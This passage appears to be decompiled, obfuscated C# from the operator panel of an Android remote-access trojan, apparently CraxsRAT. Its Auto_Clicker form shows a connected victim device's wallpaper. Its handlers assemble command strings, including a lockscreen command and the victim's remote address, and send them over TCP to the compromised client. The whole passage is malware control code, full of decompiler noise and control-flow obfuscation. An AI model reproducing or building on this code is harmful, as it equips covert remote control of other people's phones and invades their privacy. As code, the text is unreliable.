        switch ((num2 = (uint) (~((num1 ^ -1272602591 * ~(-624758048 * 1752484413 - 1074456822) ^ 1359219783 + ~-1765703112 * 295617503 * -1783640103) * 2001166397 - -203488631 * (-222707103 ^ 1542091539)) + 767408515)) % 7U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((CraxsAbout) this).Classclient).myClient;
            strArray = ((Data) ((CraxsAbout) this).Classclient).Keys.Split(':');
            num1 = (int) num2 * -1432846953 ^ 99033887;
            continue;
          case 1:
            CraxsAlert.Showinformation(EXGuarder.\u003120C415B);
            num1 = (int) num2 * -276545856 ^ -1844774077;
            continue;
          case 2:
            goto label_1;
          case 3:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00326724560 + this.selectedrecord.Text + EXGuarder.\u00314530821 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((CraxsAbout) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0030A19450B),
              (object) ((CraxsAbout) this).Classclient
            };
            num1 = (int) num2 * -967482249 ^ 1959971700;
            continue;
          case 4:
            ((CraxsAbout) this).Classclient.SendMessage(ParametersObjects);
            num1 = (int) num2 * 2142580115 ^ -447234637;
            continue;
          case 5:
            goto label_5;
          case 6:
            goto label_3;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:
      return;
label_5:
      num1 = ((CraxsAbout) this).Classclient == null ? 1963046083 : (num1 = -771707862);
      goto label_2;
    }

    private void Auto_Clicker_Load(object sender, EventArgs e)
    {
      // ISSUE: reference to a compiler-generated field
      this.clientimage.Image = (Image) ((Data._Closure\u0024__39\u002D17) ((CraxsAbout) this).Classclient).Wallpaper;
    }

    private void Auto_Clicker_FormClosing(object sender, FormClosingEventArgs e)
    {
      if (((CraxsAbout) this).Classclient == null)
        return;
label_1:
      int num1 = 1180001081;
      TcpClient client;
      string[] strArray;
      object[] ParametersObjects;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~(num1 * -521201037) ^ -(492932663 - 1843711653) - 868075905) * 502772429 * -528741427)) % 6U)
        {
          case 0:
            ((CraxsAbout) this).Classclient.SendMessage(ParametersObjects);
            num1 = (int) num2 * -1444595027 ^ -1985390724;
            continue;
          case 1:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((CraxsAbout) this).Classclient).myClient;
            num1 = (int) num2 * -1159826816 ^ -798312809;
            continue;
          case 2:
            goto label_1;
          case 3:
            strArray = ((Data) ((CraxsAbout) this).Classclient).Keys.Split(':');
            num1 = (int) num2 * 1513954719 ^ -1531203686;
            continue;
          case 4:
            goto label_8;
          case 5:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00307181776 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((CraxsAbout) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00307760E3F),
              (object) ((CraxsAbout) this).Classclient
            };
            num1 = (int) num2 * -154963330 ^ -1966363834;
            continue;
          default:
            goto label_9;
        }
      }
label_8:
      return;
label_9:;
    }

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public extern Auto_Clicker(object TargetObject, IntPtr TargetMethod);

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public virtual extern IAsyncResult BeginInvoke(
      object[] obj,
      AsyncCallback DelegateCallback,
      object DelegateAsyncState);

    public delegate void Drawdele(object[] obj);

    public delegate void updatedele(object[] obj);

    public delegate void recordnames(object[] obj);
  }
}
